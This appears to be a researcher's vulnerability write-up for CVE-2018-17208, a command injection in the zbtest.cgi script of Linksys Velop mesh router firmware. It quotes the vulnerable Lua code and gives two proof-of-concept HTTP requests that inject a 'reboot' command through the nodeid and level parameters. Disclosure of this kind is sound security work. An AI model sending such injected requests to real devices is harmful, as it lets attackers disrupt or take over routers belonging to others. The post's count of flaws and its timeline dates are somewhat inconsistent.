---
published: true
categories: [vulnerability,Linksys]
tags: [CVE-2018-17208]
---

### Affected Software
Firmware version:	The firmware version which I test is 1.1.2.185309
### Product Background
Velop is WHOLE HOMEMESH Wi-Fi system from LINKSYS. It allows users enjoy fast, nonstop Wi-Fi everywhere with Velop’s modular easy-to-use Wi-Fi Mesh system.
There are three categories from their official site :WHW0303,WHW0302,WHW0301. The differences between these three is the pack count: 1, 2 or 3. The system are the same.
### Vulnerability Details
CVE-2018-17208

Since this bug is very easy and there is another researcher has (published)[https://langkjaer.com/velop.html] the anlysis, so I wont analyze it too much.

zbtest.cgi in /cgi-bin/ is a lua script and we took a look into it. The most interesting part starts from line 480:
~~~lua
-- Here is a some code that can control bulb
cmd = params["cmd"]
node_id = params["nodeid"]
level = params["level"]

if cmd == nil then
  node_id = nil
  start_zb_network()
  print("Run zbtest.cgi<br>")
elseif cmd == "permit" then
  permit_zb_network()
  print("Run permit command<br><br>")
elseif cmd == "rescan" then
  print("Run rescan command<br><br>")
  node_id = nil
elseif cmd == "remove" and node_id then
  print("Run remove command : "..node_id.."<br><br>")
  remove_bulbs(node_id)
  node_id = nil
elseif cmd == "on" and node_id then
  print("Run turn on command : "..node_id.."<br><br>")
  name = "/tmp/Belkin_settings/zbdev."..node_id..".state"
  ShellExecute("zbapitest on-off "..node_id.." 1 > "..name.." 2>&1")
  bulbs, err = table.load("/tmp/Belkin_settings/bulbs.tlb")
  bulbs[node_id].onoff = "1"
  table.save(bulbs, "/tmp/Belkin_settings/bulbs.tlb")
elseif cmd == "off" and node_id then
  print("Run turn off command : "..node_id.."<br><br>")
  name = "/tmp/Belkin_settings/zbdev."..node_id..".state"
  ShellExecute("zbapitest on-off "..node_id.." 0 > "..name.." 2>&1")
  bulbs, err = table.load("/tmp/Belkin_settings/bulbs.tlb")
  bulbs[node_id].onoff = "0"
  table.save(bulbs, "/tmp/Belkin_settings/bulbs.tlb")
elseif cmd == "level" and level and node_id then
  print("Run level ("..level..") command : "..node_id.."<br><br>")
  -- name = "/tmp/Belkin_settings/zbdev."..node_id..".state"
  -- ShellExecute("zbapitest level "..node_id.." "..level.." 0 > "..name.." 2>&1")
  ShellExecute("zbapitest level "..node_id.." "..level.." 0 1")
  bulbs, err = table.load("/tmp/Belkin_settings/bulbs.tlb")
  bulbs[node_id].level = level
  table.save(bulbs, "/tmp/Belkin_settings/bulbs.tlb")
end
~~~

We can deliver 3 parameters to the zbtest.cgi: cmd, nodeid and level. There are 5 command injection problems in this code snippet.

- cmd with "remove", no check of node_id
- cmd with "on", no check of node_id
- cmd with "off", no check of node_id
- cmd with "level", no check of node_id and level

#### PoC
~~~http
GET /cgi-bin/zbtest.cgi?cmd=off&nodeid=|reboot| HTTP/1.1
Host: 192.168.1.1
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: visited-index=true
Connection: close
~~~

~~~http
GET /cgi-bin/zbtest.cgi?cmd=level&nodeid=0x0&level=1|reboot| HTTP/1.1
Host: 192.168.1.1
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: visited-index=true
Connection: close
~~~

### Timeline

We reported the bug to the vendor in Feb,2019 and they released a patch in August:

~~~text
2018.04.04: Found the bug

2018-09-19: Another researcher published the bug with link: link](https://langkjaer.com/velop.html)
~~~